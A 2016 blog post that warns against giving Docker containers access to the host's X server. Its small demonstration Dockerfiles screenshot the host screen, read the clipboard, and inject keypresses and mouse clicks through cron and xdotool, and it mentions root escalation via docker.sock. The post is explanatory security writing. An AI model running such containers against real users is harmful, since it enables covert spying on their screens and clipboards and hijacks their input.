---
title: 'Docker Security Risks: GUIs + Xorg'
author: nicr9
type: post
date: 2016-02-27T11:39:47+00:00
url: /2016/02/27/docker-security-risks-guis-xorg/
featured_image: /wp-content/uploads/2016/02/docker_and_xorg2.png
tags:
  - docker
  - security
---

Recently I [wrote a post][1] where I was running a GUI application in a docker container. I did so because I couldn't be confident of the software's origins and thought it'd be best not to take any chances. What other potential exploits does this leave one vulnerable to and how can one best protect themselves?

![Docker and Xorg](/wp-content/uploads/2016/02/docker_and_xorg2.png)

## But isn't everything running in Docker secure?

First things first, let's talk about what kind of security assurances docker tries to provide and under what circumstances those assurances would be considered null and void.

One of the major selling points of containers is the various forms of isolation that they provide (here's Solomon's [list from DockerConEu][2]). Docker's strategy is to lock down as many avenues between containers and the host as it can. From here it lets you decide whether or not your application needs them and lets you open some of these avenues at your discretion.

This means that you're free to provide containers with access to things like `/var/run/docker.sock` which means they can control the docker engine running on the host. People do this all the time, e.g., if they're running Continuous Integration software inside a container that wants to execute build plans in other containers. That doesn't mean that it's particularly safe if you don't trust code running in those build plans. Processes in these containers could use this to become root on the host (here's a [pretty succinct explanation][3] of how this works), although it's my understanding that the new [support for user namespaces][4] in Docker 1.10 nips this in the bud.

This brings me back to running  GUI applications in Docker. To display the GUI they need to be able to talk to the X server (Xorg) running on your host through a socket file; `/tmp/.X11-unix`. This also provides it with access to a smorgasbord of things that it can use against you.

The problem is that Xorg is in charge of more than just what gets displayed on the screen, it also handles input from keyboard/mouse. It does have a security layer but it's kinda tacked on and doesn't support fine grain control over which resources are accessible.

## What can I do about it?

So how do we know when access to certain resources is a bad idea? I don't believe it's an exaggeration to say that every piece of software that serves a practical purpose also comes with potential security implications. Security omniscience (knowing every facet of the software we run, understanding how it relates to security and how these facets interrelate) is impractical, for this reason security omnipotence (the power to be 100% secure) is impossible.

The best we can do is to constantly seek clarity on what it is that our software does and (if at all possible) how it does it. I've found that as a result of adopting this policy, an intuition regarding security will naturally begin to develop. It all boils down to this: never stop asking questions.

So let's start asking the real questions...

## How can I fuck over the end-user?

After poking around for a bit I realised that containers with access to Xorg could indeed do some scary things (at least while the container was still running.)

So I decided I'd throw together a few demos of containers that spy on/manipulate their host. These are really basic! They're purely to remind you that just because you're running something in a container doesn't mean you're not exposed to potential attacks.

### Screenshots

Imagemagik is used a lot on Linux to take screenshots and it does this by interacting with X. Ergo; if your container has access to X on the host, than it can screenshot the host (and without any particular form of warning/indication to users).

Here's a demo `Dockerfile` that screenshots with imagemagik and displays the resulting image with `feh`:

```dockerfile
FROM ubuntu:15.10
MAINTAINER Nic Roland "nicroland9@gmail.com"

RUN apt-get update && \
    apt-get install -y imagemagick feh

ENTRYPOINT import -window root -display :0 /tmp/0.png && \
feh -. /tmp/0.png
```

Here's the commands needed to get this working:

```dockerfile
# Build the demo dockerfile
docker build -f Dockerfile.screenshot -t xattacks:screenshot .

# Allow Docker processes to access X
xhost local:root

# Run container that takes a screenshot on the host (imagemagick) and displays it for you (feh)
docker run -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=$DISPLAY xattacks:screenshot
```

You'll notice that the only additional things this container needs is to tell `xhost` to allow any access from localhost, to mount the X socket and provide the display number. These are all things you would need to do to allow any GUI to run from the confines of a container so nothing out of the ordinary here...

### Toggling capslock every 20 minutes

This example installs `xdotool` which can be used for (among other things) simulating keypresses. Then it creates a `cron` that uses `xdotool` to toggle caps lock every 20 minutes.

Clearly I'm some kind of deranged lunatic for coming up with something this nefarious. **Please use responsibly**.

```dockerfile
FROM ubuntu:15.10
MAINTAINER Nic Roland "nicroland9@gmail.com"

RUN apt-get update && \
    apt-get install -y xdotool cron && \
    apt-get clean

RUN echo "20 * * * * xdotool key Caps_Lock" > capslock.cron
RUN crontab capslock.cron

ENTRYPOINT cron -f
```

Pretty much the same docker commands for running this container so I won't bother including those from now on.

### Peeking at the clipboard

This one is ridiculously easy! `xclip` is a tool for read and write access to the various clipboards provided by X. That includes the regular clipboard (`Ctrl+c`/`Ctrl+v`), used in the example here, as well as the selection clipboard (highlight/middle mouse button) if you're on Linux.

```dockerfile
FROM ubuntu:15.10
MAINTAINER Nic Roland "nicroland9@gmail.com"

RUN apt-get update && \
    apt-get install -y xclip && \
    apt-get clean

ENTRYPOINT xclip -o -selection clipboard
```

### Scripting mouse movements

Our old friend `xdotool` can also be used to script mouse movements! Here's an example of it moving to certain co-ordinates (15, 15) and clicking, it's just a minor modification of the capslock example:

```dockerfile
FROM ubuntu:15.10
MAINTAINER Nic Roland "nicroland9@gmail.com"

RUN apt-get update && \
    apt-get install -y xdotool cron && \
    apt-get clean

RUN echo "20 * * * * xdotool movemouse 15 15 click 1" > mouse.cron
RUN crontab mouse.cron

ENTRYPOINT cron -f
```

On it's own this could be fairly random and useless but if we were to combine this with the screenshots we took above, we could get a reasonable idea of where we'd like to click to cause the most damage.

### What else?

We could go further and grant access to other stuff like `/dev/input/*` (to log data from keyboard + mouse), `/dev/snd` (speakers + microphones) or `/dev/video0` (web cams). The possibilities are endless.

With all of this we could put together a [RAT][5]!... But at the risk of being put on some kinda watch-list, I think I'll just leave that as an exercise for the reader...

## Conclusions

The purpose of this article is to inform you of what you're opening yourself up to when running GUIs in containers. Don't do it when you're working on anything sensitive on the host!

If you don't actually need to interact with the GUI itself (maybe you're considering your testing options) then you might get some of the benefits of containerisation by running these applications headless (a lot of people [containerise Selenium tests][6] this way).

**Silver lining**: Programs running in containers need some kind of exploit to escape the confines of that container (like the `/var/run/docker.sock` thing I talked about at the beginning). This means that most of the time we can be assured that as soon as we stop the container running our hypothetical RAT, it will be unable to continue spying on us (it's the equivalent of pulling the plug.)

 [1]: /2015/12/06/running-qtcreator-in-docker/
 [2]: https://www.slideshare.net/Docker/dockercon-eu-day-1-general-session/84
 [3]: https://www.slideshare.net/gvarisco/road-to-opscon-pisa-15-devooops/54
 [4]: https://blog.docker.com/2016/02/docker-engine-1-10-security/
 [5]: https://www.google.ie/search?q=remote+access+trojan
 [6]: https://agiletesting.blogspot.ie/2016/01/running-headless-selenium-webdriver.html
